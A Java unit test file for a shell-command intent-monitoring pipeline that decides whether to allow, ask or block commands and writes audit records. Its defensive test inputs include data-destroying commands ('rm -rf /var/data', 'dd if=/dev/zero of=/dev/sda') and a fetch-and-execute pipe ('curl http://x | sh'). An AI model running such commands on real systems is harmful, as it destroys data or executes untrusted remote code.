package com.intentguard.decision;

import java.util.ArrayList;
import java.util.EnumMap;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.OptionalDouble;
import java.util.Set;
import java.util.concurrent.atomic.AtomicReference;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import static org.mockito.Mockito.mock;

import com.intentguard.config.ThresholdConfigUpdate;
import com.intentguard.config.ThresholdConfiguration;
import com.intentguard.config.ThresholdConfigurationService;
import com.intentguard.domain.Actor;
import com.intentguard.domain.CommandEvent;
import com.intentguard.domain.ComponentId;
import com.intentguard.domain.ComponentResult;
import com.intentguard.domain.CorrectiveAction;
import com.intentguard.domain.Decision;
import com.intentguard.domain.DivergenceResult;
import com.intentguard.domain.InputOrigin;
import com.intentguard.domain.IntentSource;
import com.intentguard.domain.ProfileState;
import com.intentguard.domain.RawShellSignal;
import com.intentguard.domain.ScoringConfig;
import com.intentguard.domain.ScoringContext;
import com.intentguard.domain.Verdict;
import com.intentguard.explanation.ExplanationGenerator;
import com.intentguard.ingest.ShellSignalNormalizer;
import com.intentguard.intent.DefaultIntentSessionManager;
import com.intentguard.intent.InferredIntentService;
import com.intentguard.intent.IntentSession;
import com.intentguard.llm.LlmService;
import com.intentguard.persistence.AuditHistoryDocument;
import com.intentguard.persistence.AuditHistoryRepository;
import com.intentguard.persistence.AuditWriteAheadBuffer;
import com.intentguard.persistence.BehavioralProfileDocument;
import com.intentguard.persistence.BehavioralProfileRepository;
import com.intentguard.persistence.IntentSessionDocument;
import com.intentguard.persistence.IntentSessionRepository;
import com.intentguard.persistence.ThresholdConfigRepository;
import com.intentguard.profile.BehavioralProfileManager;
import com.intentguard.scoring.ScoringPipeline;
import com.mongodb.client.MongoDatabase;

/**
 * End-to-end tests for the wired {@link PipelineDecisionProvider} (Task 13.1) using in-memory
 * repository fakes and a controllable {@link ScoringPipeline}. They assert the full ingest &rarr;
 * intent &rarr; scoring &rarr; decision &rarr; explanation &rarr; persist path:
 *
 * <ul>
 *   <li>a decision produces a {@link Verdict} and persists a <em>complete</em> Audit_History record
 *       (every component score + applied weight, composite, action, reason, explanation for
 *       ask/block) — Req 5.7, 7.4, 8.3, 11.1;</li>
 *   <li>an ALLOW updates the Behavioral_Profile while ask/block leave it unchanged — Req 3.2;</li>
 *   <li>an open Intent_Session tags the event and flows its intent text into scoring — Req 4.2;</li>
 *   <li>a block is never lost when the Datastore write transiently fails (bounded write-ahead
 *       buffer) — Req 11.1, 13.2.</li>
 * </ul>
 */
class PipelineDecisionProviderTest {

    private FakeAuditHistoryRepository auditRepository;
    private FakeIntentSessionRepository sessionRepository;
    private FakeBehavioralProfileRepository profileRepository;
    private AuditWriteAheadBuffer auditBuffer;
    private BehavioralProfileManager profileManager;
    private DefaultIntentSessionManager intentSessionManager;
    private ThresholdConfigurationService configService;
    private CapturingScoringPipeline scoringPipeline;
    private ExplanationGenerator explanationGenerator;

    @BeforeEach
    void setUp() {
        auditRepository = new FakeAuditHistoryRepository();
        sessionRepository = new FakeIntentSessionRepository();
        profileRepository = new FakeBehavioralProfileRepository();
        auditBuffer = new AuditWriteAheadBuffer(auditRepository, 100);
        profileManager = new BehavioralProfileManager(profileRepository);
        intentSessionManager = new DefaultIntentSessionManager(sessionRepository, auditRepository);
        configService = new ThresholdConfigurationService(mock(ThresholdConfigRepository.class));
        scoringPipeline = new CapturingScoringPipeline();
        explanationGenerator = new ExplanationGenerator(new NoLlmService());
    }

    private PipelineDecisionProvider provider() {
        return new PipelineDecisionProvider(
                new ShellSignalNormalizer(),
                intentSessionManager,
                configService,
                profileManager,
                scoringPipeline,
                new DefaultDecisionEngine(new TamperClassifier()),
                explanationGenerator,
                auditBuffer);
    }

    @Test
    void blockDecisionProducesVerdictAndPersistsCompleteAuditRecord() {
        // ACTIVE profile so a block is not clamped to ask.
        seedActiveProfile("alice", 5);
        configService.initialize(config(0.4, 0.7, /* learningMinEvents */ 1));
        scoringPipeline.willReturn(blockResult());

        Verdict verdict = provider().decide(signal("alice", "rm -rf /var/data", InputOrigin.TYPED));

        assertThat(verdict.action()).isEqualTo(CorrectiveAction.BLOCK);
        assertThat(verdict.allowsExecution()).isFalse();
        assertThat(verdict.explanation()).isNotBlank();

        assertThat(auditRepository.saved()).hasSize(1);
        AuditHistoryDocument record = auditRepository.saved().get(0);
        assertThat(record.getRecordType()).isEqualTo(PipelineDecisionProvider.RECORD_TYPE_DECISION);
        assertThat(record.getCorrectiveAction()).isEqualTo("BLOCK");
        assertThat(record.getReasonCode()).isEqualTo("THRESHOLD_BLOCK");
        assertThat(record.getDivergenceScore()).isEqualTo(0.9);
        assertThat(record.getExplanation()).isNotBlank();
        assertThat(record.getProfileState()).isEqualTo("ACTIVE");
        assertThat(record.getEventId()).isNotBlank();
        assertThat(record.getUserId()).isEqualTo("alice");
        assertThat(record.getCommandText()).isEqualTo("rm -rf /var/data");
        assertThat(record.isIntentPresent()).isFalse();
        assertThat(record.getIntentSource()).isEqualTo("NONE");

        // Every component score + applied weight is recorded, and the excluded set is preserved.
        assertThat(record.getComponents()).hasSize(4);
        Map<String, Double> weightById = new HashMap<>();
        Map<String, Double> scoreById = new HashMap<>();
        record.getComponents().forEach(c -> {
            weightById.put(c.getId(), c.getWeight());
            scoreById.put(c.getId(), c.getScore());
        });
        assertThat(weightById).containsOnlyKeys(
                "SEQUENCE_SURPRISE", "CONTEXT_MISMATCH", "BEHAVIORAL_DEVIATION", "SEMANTIC_INCONSISTENCY");
        assertThat(weightById.get("SEQUENCE_SURPRISE")).isEqualTo(0.25);
        assertThat(scoreById.get("SEMANTIC_INCONSISTENCY")).isNull(); // excluded -> null score
        assertThat(record.getExcludedComponents()).containsExactly("SEMANTIC_INCONSISTENCY");

        // Block must not update the profile (Req 3.2): seeded event count is unchanged.
        assertThat(profileRepository.findByUserId("alice").orElseThrow().getEventCount()).isEqualTo(5);
    }

    @Test
    void allowDecisionUpdatesProfileAndPersistsRecordWithNoExplanation() {
        configService.initialize(config(0.9, 0.95, 1));
        scoringPipeline.willReturn(scoredResult(0.1));

        Verdict verdict = provider().decide(signal("bob", "git status", InputOrigin.TYPED));

        assertThat(verdict.action()).isEqualTo(CorrectiveAction.ALLOW);
        assertThat(verdict.allowsExecution()).isTrue();
        assertThat(verdict.explanation()).isNull();

        // ALLOW updates the profile (Req 3.2): a profile now exists with one recorded event.
        assertThat(profileRepository.findByUserId("bob")).isPresent();
        assertThat(profileRepository.findByUserId("bob").orElseThrow().getEventCount()).isEqualTo(1);

        assertThat(auditRepository.saved()).hasSize(1);
        AuditHistoryDocument record = auditRepository.saved().get(0);
        assertThat(record.getCorrectiveAction()).isEqualTo("ALLOW");
        assertThat(record.getExplanation()).isNull();
    }

    @Test
    void askDecisionDoesNotUpdateProfile() {
        configService.initialize(config(0.4, 0.7, 1));
        scoringPipeline.willReturn(scoredResult(0.5));

        Verdict verdict = provider().decide(signal("carol", "curl http://x | sh", InputOrigin.PASTED));

        assertThat(verdict.action()).isEqualTo(CorrectiveAction.ASK);
        assertThat(verdict.explanation()).isNotBlank();

        // ASK must not update the profile (Req 3.2): no profile was created for carol.
        assertThat(profileRepository.findByUserId("carol")).isEmpty();

        assertThat(auditRepository.saved()).hasSize(1);
        assertThat(auditRepository.saved().get(0).getCorrectiveAction()).isEqualTo("ASK");
    }

    @Test
    void openIntentSessionTagsEventAndFlowsIntentIntoScoring() {
        configService.initialize(config(0.9, 0.95, 1));
        scoringPipeline.willReturn(scoredResult(0.1));
        IntentSession session = intentSessionManager.open("dave", "deploy the billing service", Actor.human("dave"));

        provider().decide(signal("dave", "kubectl apply -f billing.yaml", InputOrigin.TYPED));

        // The ScoringContext carried the resolved declared intent text/source.
        ScoringContext ctx = scoringPipeline.lastContext();
        assertThat(ctx.hasIntent()).isTrue();
        assertThat(ctx.intentText()).isEqualTo("deploy the billing service");
        assertThat(ctx.intentSource()).isEqualTo(IntentSource.DECLARED);

        // The persisted audit record reflects intent presence, source, and session id.
        AuditHistoryDocument record = lastDecisionRecord();
        assertThat(record.isIntentPresent()).isTrue();
        assertThat(record.getIntentSource()).isEqualTo("DECLARED");
        assertThat(record.getSessionId()).isEqualTo(session.sessionId());
    }

    @Test
    void blockIsNotLostWhenDatastoreWriteTransientlyFails() {
        seedActiveProfile("erin", 5);
        configService.initialize(config(0.4, 0.7, 1));
        scoringPipeline.willReturn(blockResult());
        auditRepository.failWrites(true); // simulate a transient Datastore outage

        Verdict verdict = provider().decide(signal("erin", "dd if=/dev/zero of=/dev/sda", InputOrigin.TYPED));

        // The verdict is still returned to the hook even though the write failed...
        assertThat(verdict.action()).isEqualTo(CorrectiveAction.BLOCK);
        // ...and the block is retained in the bounded write-ahead buffer (never lost).
        assertThat(auditBuffer.bufferedCount()).isEqualTo(1);
        assertThat(auditRepository.saved()).isEmpty();

        // On recovery the buffered block flushes durably to the Datastore.
        auditRepository.failWrites(false);
        int flushed = auditBuffer.flush();
        assertThat(flushed).isEqualTo(1);
        assertThat(auditBuffer.bufferedCount()).isZero();
        assertThat(auditRepository.saved()).hasSize(1);
        assertThat(auditRepository.saved().get(0).getCorrectiveAction()).isEqualTo("BLOCK");
    }

    @Test
    void inferredIntentDisabledLeavesIntentSourceNoneWhenNoSession() {
        configService.initialize(config(0.9, 0.95, 1));
        scoringPipeline.willReturn(scoredResult(0.1));
        seedProfileWithVocabulary("frank", Map.of("git", 10));
        // Feature flag OFF: the service is wired but never derives an intent.
        PipelineDecisionProvider provider = providerWithInferredIntent(
                inferredIntentService(false, Optional.of("some inferred goal")));

        provider.decide(signal("frank", "git status", InputOrigin.TYPED));

        ScoringContext ctx = scoringPipeline.lastContext();
        assertThat(ctx.hasIntent()).isFalse();
        assertThat(ctx.intentSource()).isEqualTo(IntentSource.NONE);
        assertThat(ctx.intentText()).isNull();

        AuditHistoryDocument record = lastDecisionRecord();
        assertThat(record.isIntentPresent()).isFalse();
        assertThat(record.getIntentSource()).isEqualTo("NONE");
    }

    @Test
    void inferredIntentEnabledDerivesInferredIntentWhenNoSession() {
        configService.initialize(config(0.9, 0.95, 1));
        scoringPipeline.willReturn(scoredResult(0.1));
        seedProfileWithVocabulary("grace", Map.of("git", 40, "kubectl", 10));
        // Feature flag ON, recent commands present, LLM returns a summary.
        PipelineDecisionProvider provider = providerWithInferredIntent(
                inferredIntentService(true, Optional.of("deploying the billing service")));

        provider.decide(signal("grace", "kubectl apply -f billing.yaml", InputOrigin.TYPED));

        // The event is scored against the derived Inferred_Intent with source INFERRED (Req 14.1, 14.2).
        ScoringContext ctx = scoringPipeline.lastContext();
        assertThat(ctx.hasIntent()).isTrue();
        assertThat(ctx.intentSource()).isEqualTo(IntentSource.INFERRED);
        assertThat(ctx.intentText()).isEqualTo("deploying the billing service");

        // The persisted record records the intent as inferred (Req 14.2).
        AuditHistoryDocument record = lastDecisionRecord();
        assertThat(record.isIntentPresent()).isTrue();
        assertThat(record.getIntentSource()).isEqualTo("INFERRED");
        // No session was opened, so no session id is attached.
        assertThat(record.getSessionId()).isNull();
    }

    @Test
    void inferredIntentEnabledButLlmUnavailableLeavesIntentSourceNone() {
        configService.initialize(config(0.9, 0.95, 1));
        scoringPipeline.willReturn(scoredResult(0.1));
        seedProfileWithVocabulary("heidi", Map.of("curl", 5));
        // Feature flag ON but the LLM cannot summarize: degrade to no inferred intent.
        PipelineDecisionProvider provider = providerWithInferredIntent(
                inferredIntentService(true, Optional.empty()));

        provider.decide(signal("heidi", "curl http://x", InputOrigin.TYPED));

        ScoringContext ctx = scoringPipeline.lastContext();
        assertThat(ctx.hasIntent()).isFalse();
        assertThat(ctx.intentSource()).isEqualTo(IntentSource.NONE);

        AuditHistoryDocument record = lastDecisionRecord();
        assertThat(record.getIntentSource()).isEqualTo("NONE");
    }

    @Test
    void declaredSessionTakesPrecedenceOverInferredIntent() {
        configService.initialize(config(0.9, 0.95, 1));
        scoringPipeline.willReturn(scoredResult(0.1));
        seedProfileWithVocabulary("ivan", Map.of("git", 10));
        intentSessionManager.open("ivan", "declared goal", Actor.human("ivan"));
        // Even with inferred-intent enabled, an open Declared session wins and the LLM is not consulted.
        PipelineDecisionProvider provider = providerWithInferredIntent(
                inferredIntentService(true, Optional.of("inferred goal")));

        provider.decide(signal("ivan", "git status", InputOrigin.TYPED));

        ScoringContext ctx = scoringPipeline.lastContext();
        assertThat(ctx.intentSource()).isEqualTo(IntentSource.DECLARED);
        assertThat(ctx.intentText()).isEqualTo("declared goal");
    }

    // --- helpers ------------------------------------------------------------------------------

    private PipelineDecisionProvider providerWithInferredIntent(InferredIntentService inferredIntentService) {
        PipelineDecisionProvider provider = provider();
        provider.setInferredIntentService(inferredIntentService);
        return provider;
    }

    private InferredIntentService inferredIntentService(boolean enabled, Optional<String> summary) {
        return new InferredIntentService(profileManager, new SummarizingLlmService(summary), enabled);
    }

    private void seedProfileWithVocabulary(String userId, Map<String, Integer> vocabulary) {
        BehavioralProfileDocument doc = new BehavioralProfileDocument();
        doc.setUserId(userId);
        doc.setEventCount(vocabulary.values().stream().mapToLong(Integer::longValue).sum());
        doc.setState(ProfileState.ACTIVE.name());
        doc.setVocabulary(new HashMap<>(vocabulary));
        profileRepository.save(doc);
    }

    private AuditHistoryDocument lastDecisionRecord() {
        List<AuditHistoryDocument> decisions = new ArrayList<>();
        for (AuditHistoryDocument doc : auditRepository.saved()) {
            if (PipelineDecisionProvider.RECORD_TYPE_DECISION.equals(doc.getRecordType())) {
                decisions.add(doc);
            }
        }
        assertThat(decisions).isNotEmpty();
        return decisions.get(decisions.size() - 1);
    }

    private void seedActiveProfile(String userId, long eventCount) {
        BehavioralProfileDocument doc = new BehavioralProfileDocument();
        doc.setUserId(userId);
        doc.setEventCount(eventCount);
        doc.setState(ProfileState.ACTIVE.name());
        profileRepository.save(doc);
    }

    private static RawShellSignal signal(String user, String command, InputOrigin origin) {
        return new RawShellSignal(Actor.human(user), command, "/home/" + user, Map.of(), 1_710_000_000_000L, origin);
    }

    private static ThresholdConfiguration config(double ask, double block, int learningMinEvents) {
        Map<ComponentId, Double> weights = new EnumMap<>(ComponentId.class);
        weights.put(ComponentId.SEQUENCE_SURPRISE, 0.25);
        weights.put(ComponentId.CONTEXT_MISMATCH, 0.20);
        weights.put(ComponentId.BEHAVIORAL_DEVIATION, 0.25);
        weights.put(ComponentId.SEMANTIC_INCONSISTENCY, 0.30);
        ThresholdConfigUpdate update = new ThresholdConfigUpdate(
                ask, block, weights, 0.15, learningMinEvents, 5000, 15000, 1200, 1000);
        return ThresholdConfiguration.fromUpdate(1, update, "test", 0L);
    }

    /** A block-range result (composite 0.9) with the semantic component excluded. */
    private static DivergenceResult blockResult() {
        List<ComponentResult> components = List.of(
                ComponentResult.scored(ComponentId.SEQUENCE_SURPRISE, 0.9, 0.25, null),
                ComponentResult.scored(ComponentId.CONTEXT_MISMATCH, 0.9, 0.20, null),
                ComponentResult.scored(ComponentId.BEHAVIORAL_DEVIATION, 0.9, 0.25, "high deviation"),
                ComponentResult.excluded(ComponentId.SEMANTIC_INCONSISTENCY, 0.30, "no_intent"));
        return new DivergenceResult(0.9, components, Set.of(ComponentId.SEMANTIC_INCONSISTENCY));
    }

    /** A fully-scored result with the given composite. */
    private static DivergenceResult scoredResult(double composite) {
        List<ComponentResult> components = List.of(
                ComponentResult.scored(ComponentId.SEQUENCE_SURPRISE, composite, 0.25, null),
                ComponentResult.scored(ComponentId.CONTEXT_MISMATCH, composite, 0.20, null),
                ComponentResult.scored(ComponentId.BEHAVIORAL_DEVIATION, composite, 0.25, null),
                ComponentResult.scored(ComponentId.SEMANTIC_INCONSISTENCY, composite, 0.30, null));
        return new DivergenceResult(composite, components, Set.of());
    }

    /** A {@link ScoringPipeline} that captures the last context and returns a preset result. */
    private static final class CapturingScoringPipeline implements ScoringPipeline {
        private final AtomicReference<ScoringContext> lastContext = new AtomicReference<>();
        private volatile DivergenceResult result;

        void willReturn(DivergenceResult result) {
            this.result = result;
        }

        ScoringContext lastContext() {
            return lastContext.get();
        }

        @Override
        public DivergenceResult score(CommandEvent event, ScoringConfig config) {
            return result;
        }

        @Override
        public DivergenceResult score(ScoringContext ctx) {
            lastContext.set(ctx);
            return result;
        }
    }

    /** An {@link LlmService} that is always unavailable, forcing the deterministic explanation. */
    private static final class NoLlmService implements LlmService {
        @Override
        public OptionalDouble semanticInconsistency(CommandEvent event, String intentText) {
            return OptionalDouble.empty();
        }

        @Override
        public Optional<String> explain(CommandEvent event, DivergenceResult result, Decision decision) {
            return Optional.empty();
        }
    }

    /**
     * An {@link LlmService} whose {@code summarizeIntent} returns a preset optional, used to drive
     * the Inferred_Intent derivation path deterministically without any network.
     */
    private static final class SummarizingLlmService implements LlmService {
        private final Optional<String> summary;

        SummarizingLlmService(Optional<String> summary) {
            this.summary = summary;
        }

        @Override
        public OptionalDouble semanticInconsistency(CommandEvent event, String intentText) {
            return OptionalDouble.empty();
        }

        @Override
        public Optional<String> explain(CommandEvent event, DivergenceResult result, Decision decision) {
            return Optional.empty();
        }

        @Override
        public Optional<String> summarizeIntent(java.util.List<String> recentCommands) {
            return summary;
        }
    }

    /** In-memory {@link AuditHistoryRepository} with an optional transient-failure toggle. */
    private static final class FakeAuditHistoryRepository extends AuditHistoryRepository {
        private final List<AuditHistoryDocument> records = new ArrayList<>();
        private volatile boolean failing;

        FakeAuditHistoryRepository() {
            super(mock(MongoDatabase.class));
        }

        void failWrites(boolean failing) {
            this.failing = failing;
        }

        @Override
        public void save(AuditHistoryDocument record) {
            if (failing) {
                throw new IllegalStateException("simulated Datastore outage");
            }
            records.add(record);
        }

        List<AuditHistoryDocument> saved() {
            return records;
        }
    }

    /** In-memory {@link IntentSessionRepository}. */
    private static final class FakeIntentSessionRepository extends IntentSessionRepository {
        private final Map<String, IntentSessionDocument> store = new HashMap<>();

        FakeIntentSessionRepository() {
            super(mock(MongoDatabase.class));
        }

        @Override
        public void save(IntentSessionDocument session) {
            store.put(session.getSessionId(), session);
        }

        @Override
        public Optional<IntentSessionDocument> findBySessionId(String sessionId) {
            return Optional.ofNullable(store.get(sessionId));
        }

        @Override
        public Optional<IntentSessionDocument> findOpenByUserId(String userId) {
            return store.values().stream()
                    .filter(doc -> userId.equals(doc.getUserId()) && doc.isOpen())
                    .findFirst();
        }
    }

    /** In-memory {@link BehavioralProfileRepository}. */
    private static final class FakeBehavioralProfileRepository extends BehavioralProfileRepository {
        private final Map<String, BehavioralProfileDocument> store = new HashMap<>();

        FakeBehavioralProfileRepository() {
            super(mock(MongoDatabase.class));
        }

        @Override
        public Optional<BehavioralProfileDocument> findByUserId(String userId) {
            return Optional.ofNullable(store.get(userId));
        }

        @Override
        public void save(BehavioralProfileDocument profile) {
            store.put(profile.getUserId(), profile);
        }
    }
}
